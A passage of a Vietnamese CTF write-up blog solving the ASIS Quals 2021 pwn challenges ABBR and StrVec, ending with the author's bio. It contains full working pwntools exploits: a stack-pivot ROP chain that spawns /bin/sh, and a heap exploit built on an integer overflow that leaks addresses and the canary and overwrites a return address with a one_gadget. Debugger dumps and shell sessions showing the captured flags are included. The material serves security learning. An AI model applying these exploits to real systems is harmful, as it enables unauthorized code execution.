(_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* \u0026#39;\\n\u0026#39; */ *R8 0x214cb90 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; *R9 0x0 R10 0x49e522 ◂— \u0026#39;Enter text: \u0026#39; R11 0x246 R12 0x4030e0 (__libc_csu_fini) ◂— endbr64 R13 0x0 R14 0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 R15 0x0 RBP 0x7ffe20727c60 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 RSP 0x7ffe20727c50 ◂— 0x0 *RIP 0x402015 (main+157) ◂— mov rax, qword ptr [rbp - 8] ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x402003 \u0026lt;main+139\u0026gt; mov rax, qword ptr [rbp - 8] 0x402007 \u0026lt;main+143\u0026gt; mov rax, qword ptr [rax + 8] 0x40200b \u0026lt;main+147\u0026gt; mov esi, ecx 0x40200d \u0026lt;main+149\u0026gt; mov rdi, rax 0x402010 \u0026lt;main+152\u0026gt; call fgets \u0026lt;fgets\u0026gt; ► 0x402015 \u0026lt;main+157\u0026gt; mov rax, qword ptr [rbp - 8] 0x402019 \u0026lt;main+161\u0026gt; mov rax, qword ptr [rax + 8] 0x40201d \u0026lt;main+165\u0026gt; movzx eax, byte ptr [rax] 0x402020 \u0026lt;main+168\u0026gt; cmp al, 0xa 0x402022 \u0026lt;main+170\u0026gt; je main+222 \u0026lt;main+222\u0026gt; 0x402024 \u0026lt;main+172\u0026gt; mov rax, qword ptr [rbp - 8] ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffe20727c50 ◂— 0x0 01:0008│ 0x7ffe20727c58 —▸ 0x214dba0 —▸ 0x405121 (_nl_load_domain+737) ◂— xchg eax, esp 02:0010│ rbp 0x7ffe20727c60 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 03:0018│ 0x7ffe20727c68 —▸ 0x402870 (__libc_start_main+1168) ◂— mov edi, eax 04:0020│ 0x7ffe20727c70 ◂— 0x0 05:0028│ 0x7ffe20727c78 ◂— 0x100000000 06:0030│ 0x7ffe20727c80 —▸ 0x7ffe20727d98 —▸ 0x7ffe2072934a ◂— 0x5300726262612f2e /* \u0026#39;./abbr\u0026#39; */ 07:0038│ 0x7ffe20727c88 —▸ 0x401f78 (main) ◂— endbr64 ──────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x402015 main+157 f 1 0x402870 __libc_start_main+1168 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Có 2 thanh ghi chứa địa chỉ của buffer là rax và r8, vậy mình chỉ cần tìm gadget nào liên quan tới 1 trong 2 thanh ghi này và esp. Trong binary có 1 gadget như vậy là xchg eax, esp ; ret.\n*RAX 0x20727c48 RBX 0x400530 ◂— 0x0 RCX 0x459e62 (read+18) ◂— cmp rax, -0x1000 /* \u0026#39;H=\u0026#39; */ RDX 0x405121 (_nl_load_domain+737) ◂— xchg eax, esp RDI 0x214cb90 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; RSI 0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* \u0026#39;\\n\u0026#39; */ R8 0x214cb90 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; R9 0x0 R10 0x49e522 ◂— \u0026#39;Enter text: \u0026#39; R11 0x246 R12 0x4030e0 (__libc_csu_fini) ◂— endbr64 R13 0x0 R14 0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 R15 0x0 RBP 0x7ffe20727c60 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 *RSP 0x214cb90 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; *RIP 0x405122 (_nl_load_domain+738) ◂— ret ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x405121 \u0026lt;_nl_load_domain+737\u0026gt; xchg eax, esp ► 0x405122 \u0026lt;_nl_load_domain+738\u0026gt; ret \u0026lt;0x6161616161616161\u0026gt; ────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rdi r8 rsp 0x214cb90 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; 01:0008│ 0x214cb98 ◂— \u0026#39;bbbbbbbb\\n\u0026#39; 02:0010│ 0x214cba0 ◂— 0xa /* \u0026#39;\\n\u0026#39; */ 03:0018│ 0x214cba8 ◂— 0x0 ... ↓ 4 skipped ──────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x405122 _nl_load_domain+738 f 1 0x6161616161616161 f 2 0x6262626262626262 f 3 0xa f 4 0x0 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Gadget đó sẽ swap eax và esp, do đó sẽ pivot được stack lên heap. Sau đó ta chỉ việc rop until it pops a shell :\u0026gt;\nFinal script from pwn import * # p = process(\u0026#39;./abbr\u0026#39;) p = remote(\u0026#39;168.119.108.148\u0026#39;, 10010) pop_rdi = 0x4018da pop_rsi = 0x404cfe pop_rdx = 0x4017df pop_rax = 0x45a8f7 syscall = 0x4012e3 mov = 0x48a425\t# mov qword ptr [rsi], rax ; ret data_seg = 0x004c91e0 xchg_eax_esp = 0x405121 payload = b\u0026#39;imnsho\u0026#39;*150 payload += b\u0026#39;a\u0026#39;*62 payload += p64(xchg_eax_esp) p.recvuntil(b\u0026#39;text: \u0026#39;) p.sendline(payload) payload = p64(pop_rsi) payload += p64(data_seg) payload += p64(pop_rax) payload += b\u0026#39;/bin/sh\\x00\u0026#39; payload += p64(mov) payload += p64(pop_rdi) payload += p64(data_seg) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.recvuntil(b\u0026#39;text: \u0026#39;) p.sendline(payload) p.interactive() [+] Opening connection to 168.119.108.148 on port 10010: Done [*] Switching to interactive mode $ id uid=999(pwn) gid=999(pwn) groups=999(pwn) $ ls chall flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt $ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n} StrVec: Category: pwn Points: 114 Solves: 38 Description: How to implement secure array in C? Is it easy, right? Source code overview #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; typedef struct { int size; void *elements[0]; } vector; void readline(const char *msg, char *buf, int length) { int i; printf(\u0026#34;%s\u0026#34;, msg); for (i = 0; i \u0026lt; length-1; i++) { if (read(0, \u0026amp;buf[i], 1) != 1 || buf[i] == \u0026#39;\\n\u0026#39;) break; } buf[i] = \u0026#39;\\0\u0026#39;; } int readint(const char *msg) { char buf[0x10] = {0}; readline(msg, buf, sizeof(buf)); return atoi(buf); } vector *vector_new(int nmemb) { if (nmemb \u0026lt;= 0) return NULL; int size = sizeof(vector) + sizeof(void*) * nmemb; vector *vec = (vector*)malloc(size); if (!vec) return NULL; memset(vec, 0, size); vec-\u0026gt;size = nmemb; return vec; } void vector_delete(vector *vec) { for (int i = 0; i \u0026lt; vec-\u0026gt;size; i++) free(vec-\u0026gt;elements[i]); free(vec); } void* vector_get(vector *vec, int idx) { if (idx \u0026lt; 0 || idx \u0026gt; vec-\u0026gt;size) return NULL; return vec-\u0026gt;elements[idx]; } int vector_set(vector *vec, int idx, void *ptr) { if (idx \u0026lt; 0 || idx \u0026gt; vec-\u0026gt;size) return -1; if (vec-\u0026gt;elements[idx]) free(vec-\u0026gt;elements[idx]); vec-\u0026gt;elements[idx] = ptr; return 0; } int main() { char name[0x10]; readline(\u0026#34;Name: \u0026#34;, name, sizeof(name)); printf(\u0026#34;Hello, %s!\\n\u0026#34;, name); int n = readint(\u0026#34;n = \u0026#34;); vector *vec = vector_new(n); if (!vec) return 1; while (1) { int choice = readint(\u0026#34;1. get\\n2. set\\n\u0026gt; \u0026#34;); switch (choice) { case 1: { int idx = readint(\u0026#34;idx = \u0026#34;); char *data = (char*)vector_get(vec, idx); printf(\u0026#34;vec.get(idx) -\u0026gt; %s\\n\u0026#34;, data ? data : \u0026#34;[undefined]\u0026#34;); break; } case 2: { int idx = readint(\u0026#34;idx = \u0026#34;); char *data = (char*)malloc(0x20); if (!data) break; readline(\u0026#34;data = \u0026#34;, data, 0x20); int result = vector_set(vec, idx, (void*)data); printf(\u0026#34;vec.set(idx, data) -\u0026gt; %d\\n\u0026#34;, result); if (result == -1) free(data); break; } default: vector_delete(vec); printf(\u0026#34;Bye, %s!\\n\u0026#34;, name); return 0; } } } __attribute__((constructor)) void setup(void) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); alarm(180); } Nhìn sơ qua thì có vẻ là 1 bài heap.\nSolution: Bug nằm ở đoạn code dưới đây:\nvector *vector_new(int nmemb) { if (nmemb \u0026lt;= 0) return NULL; int size = sizeof(vector) + sizeof(void*) * nmemb; vector *vec = (vector*)malloc(size); if (!vec) return NULL; memset(vec, 0, size); vec-\u0026gt;size = nmemb; return vec; } Nếu nmemb == 2147483647 thì size sẽ là 0 (integer overflow), và vec-\u0026gt;size không được update bằng size mà lại là nmemb nên mình có thể thực hiện out-of-bounds read and write. Mình sẽ dùng lỗi oob để leak heap với libc trước:\nname = b\u0026#39;a\u0026#39; p.recv() p.sendline(name) p.recv() p.sendline(b\u0026#39;2147483647\u0026#39;) set(0, b\u0026#39;a\u0026#39;*8) set(4) get(0) p.recvuntil(b\u0026#39;a\u0026#39;*8) heap_leak = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) log.info(\u0026#39;heap_leak: \u0026#39; + hex(heap_leak)) heap_base = heap_leak - 0x2f0 log.info(\u0026#39;heap_base: \u0026#39; + hex(heap_base)) set(1) count = 8 # Prepare to free a chunk into unsorted bin for i in range(5, 35): if(i == count): count += 6 continue set(i) set(0) set(3, p64(heap_base + 0x2d0) + p64(0x531)) set(0, p64(heap_base + 0x300)) get(5) p.recvuntil(b\u0026#39;vec.get(idx) -\u0026gt; \u0026#39;) libc_leak = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) log.info(\u0026#39;libc_leak: \u0026#39; + hex(libc_leak)) libc.address = libc_leak - 0x1ebbe0 log.info(\u0026#39;libc_base: \u0026#39; + hex(libc.address)) Sau khi đã có heap với libc address thì mình đã stuck khá lâu do mình chỉ có thể \u0026lsquo;mess\u0026rsquo; được với 1 chunk, mà size thì lại cố định là 0x20 nữa nên hầu hết các kỹ thuật đều rất khó thực hiện. Một lúc sau thì mình mới tự hỏi: \u0026lsquo;Ủa nãy giờ biến name khum thấy m xài zậy!??\u0026rsquo;.\nVà thế là 1 idea mới xuất hiện. Mình sẽ tạo 1 fake chunk trên stack bằng cách set biến name thành metadata với size của 1 chunk rồi sẽ free nó, lần malloc tiếp theo sẽ trả về fake chunk đó. Cuối cùng thì mình ghi đè return address thành one gadget.\nFinal script from pwn import * # p = process(\u0026#39;./strvec\u0026#39;) libc = ELF(\u0026#39;./libc-2.31.so\u0026#39;) p = remote(\u0026#39;168.119.108.148\u0026#39;, 12010) def set(idx, data = b\u0026#39;\\x00\u0026#39;): p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) p.sendlineafter(b\u0026#39;= \u0026#39;, str(idx).encode(\u0026#39;utf-8\u0026#39;)) p.sendlineafter(b\u0026#39;= \u0026#39;, bytes(data)) def get(idx): p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#39;= \u0026#39;, str(idx).encode(\u0026#39;utf-8\u0026#39;)) # Create a fake chunk name = p64(0) + b\u0026#39;\\x31\u0026#39; + b\u0026#39;\\x00\u0026#39;*5 p.recv() p.sendline(name) p.recv() p.sendline(b\u0026#39;2147483647\u0026#39;) set(0, b\u0026#39;a\u0026#39;*8) set(4) get(0) p.recvuntil(b\u0026#39;a\u0026#39;*8) heap_leak = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) log.info(\u0026#39;heap_leak: \u0026#39; + hex(heap_leak)) heap_base = heap_leak - 0x2f0 log.info(\u0026#39;heap_base: \u0026#39; + hex(heap_base)) set(1) count = 8 # Prepare to free a chunk into unsorted bin for i in range(5, 35): if(i == count): count += 6 continue set(i) set(0) set(3, p64(heap_base + 0x2d0) + p64(0x531)) set(0, p64(heap_base + 0x300)) get(5) p.recvuntil(b\u0026#39;vec.get(idx) -\u0026gt; \u0026#39;) libc_leak = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) log.info(\u0026#39;libc_leak: \u0026#39; + hex(libc_leak)) libc.address = libc_leak - 0x1ebbe0 log.info(\u0026#39;libc_base: \u0026#39; + hex(libc.address)) # Environ variable stores a stack address environ = libc.sym[\u0026#39;environ\u0026#39;] log.info(\u0026#39;environ: \u0026#39; + hex(environ)) one_gadget = libc.address + 0xe6c81 log.info(\u0026#39;one_gadget: \u0026#39; + hex(one_gadget)) set(35) set(0, p64(environ)) set(3, p64(0) + p64(0x31)) get(11) p.recvuntil(b\u0026#39;vec.get(idx) -\u0026gt; \u0026#39;) stack_leak = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) log.info(\u0026#39;stack_leak: \u0026#39; + hex(stack_leak)) fake_chunk = stack_leak - 0x118 set(0, p64(stack_leak - 0x10f) + p64(fake_chunk) + p64(heap_base + 0x2a0)) get(3) p.recvuntil(b\u0026#39;vec.get(idx) -\u0026gt; \u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + p.recvline().strip()) log.info(\u0026#39;canary: \u0026#39; + hex(canary)) set(4) set(36, p64(0) + p64(canary) + p64(0) + p64(one_gadget)[:6]) # Reset the size by freeing vec set(5) # Change bk pointer to double free set(0) # Get shell! p.recv() p.sendline(b\u0026#39;3\u0026#39;) p.interactive() [+] Opening connection to 168.119.108.148 on port 12010: Done [*] heap_leak: 0x5606633792f0 [*] heap_base: 0x560663379000 [*] libc_leak: 0x7f186db1cbe0 [*] libc_base: 0x7f186d931000 [*] environ: 0x7f186db202e0 [*] one_gadget: 0x7f186da17c81 [*] stack_leak: 0x7ffea895dda8 [*] canary: 0x3936128e303f100 [*] Switching to interactive mode Bye, ! $ id uid=999(pwn) gid=999(pwn) groups=999(pwn) $ ls chall flag-970df57dcd98b545bb0b620bc4b6cab0.txt $ cat flag-970df57dcd98b545bb0b620bc4b6cab0.txt ASIS{n0_1d34_4_g00d_fl4g_t3xt_59723644e687a5c5e2fe80eae0b4f4b8} ","permalink":"https://pivik271.github.io/posts/asisquals2021/","summary":"Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰\nMình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay. Các binary với solve script mình sẽ để ở đây.\nJust pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!","title":"ASIS QUALS - Just pwn it, ABBR, StrVec"},{"content":"Hi! My name is Phan Vinh Khang, also known as pivik. I am currently an Information Security student at University of Information Technology Vietnam.\nI have been learning pwn for the last few years. I also play ctf with my team purf3ct. Hopefully I will develop more skills in Information Security field in the upcoming years.\nMy Github and Twitter.\n","permalink":"https://pivik271.github.io/about/","summary":"Hi! My name is Phan Vinh Khang, also known as pivik. I am currently an Information Security student at University of Information Technology Vietnam.\nI have been learning pwn for the last few years. I also play ctf with my team purf3ct. Hopefully I will develop more skills in Information Security field in the upcoming years.\nMy Github and Twitter.","title":""}]